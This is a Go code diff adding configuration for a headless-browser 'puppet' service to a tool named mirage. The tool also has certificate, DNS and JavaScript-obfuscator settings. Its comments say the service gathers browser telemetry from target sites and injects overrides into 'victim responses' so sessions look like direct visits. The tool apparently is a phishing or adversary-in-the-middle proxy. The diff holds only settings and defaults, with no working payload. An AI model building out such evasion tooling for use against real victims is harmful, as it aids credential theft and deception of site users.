@@ -25,6 +25,7 @@ type Config struct {
 	API            APIConfig           `yaml:"api"`
 	ACME           ACMEConfig          `yaml:"acme"`
 	Obfuscator     ObfuscatorConfig    `yaml:"obfuscator"`
+	Puppet         PuppetConfig        `yaml:"puppet"`
 }
 
 // ACMEConfig holds settings for automatic certificate provisioning via ACME
@@ -53,6 +54,19 @@ type ObfuscatorConfig struct {
 	SidecarDir     string        `yaml:"sidecar_dir"`     // dir containing package.json and index.js
 	RequestTimeout time.Duration `yaml:"request_timeout"` // per-call timeout (default: 5s)
 	MaxConcurrent  int           `yaml:"max_concurrent"`  // max parallel obfuscations (default: 4)
+}
+
+// PuppetConfig holds settings for the headless browser puppet service that
+// collects real browser telemetry from target sites and injects overrides
+// into victim responses so sessions appear indistinguishable from direct visits.
+type PuppetConfig struct {
+	Enabled      bool          `yaml:"enabled"`
+	ChromiumPath string        `yaml:"chromium_path"` // empty = search PATH
+	UserAgent    string        `yaml:"user_agent"`    // empty = default Chrome UA
+	MinInstances int           `yaml:"min_instances"` // default: 1
+	MaxInstances int           `yaml:"max_instances"` // default: 3
+	NavTimeout   time.Duration `yaml:"nav_timeout"`   // default: 30s
+	CacheTTL     time.Duration `yaml:"cache_ttl"`     // default: 1h
 }
 
 // DNSProviderConfig holds the settings for one DNS provider integration.
@@ -100,6 +114,21 @@ func (c *Config) applyDefaults() {
 	}
 	if c.API.ClientCACertPath == "" {
 		c.API.ClientCACertPath = "/var/lib/mirage/api-ca.crt"
+	}
+	if c.Puppet.MinInstances <= 0 {
+		c.Puppet.MinInstances = 1
+	}
+	if c.Puppet.MaxInstances <= 0 {
+		c.Puppet.MaxInstances = 3
+	}
+	if c.Puppet.NavTimeout == 0 {
+		c.Puppet.NavTimeout = 30 * time.Second
+	}
+	if c.Puppet.CacheTTL == 0 {
+		c.Puppet.CacheTTL = 1 * time.Hour
+	}
+	if c.Puppet.UserAgent == "" {
+		c.Puppet.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
 	}
 }
 
